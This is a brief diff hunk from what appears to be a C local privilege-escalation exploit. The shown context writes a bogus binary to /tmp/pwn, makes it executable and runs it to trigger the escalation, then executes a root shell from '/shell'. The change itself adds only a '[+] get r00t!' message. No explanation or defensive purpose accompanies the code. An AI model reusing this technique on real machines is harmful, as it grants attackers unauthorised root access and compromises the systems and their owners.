@@ -104,6 +104,8 @@ int main(void)
 	system("echo -e '\xff\xff\xff\xff' > /tmp/pwn");
 	system("chmod +x /tmp/pwn");
 	system("/tmp/pwn");
+
+	printf("[+] get r00t!\n");
 	execve("/shell", (char *[]){ "/bin/sh", NULL }, NULL);
 
 	close(fd);
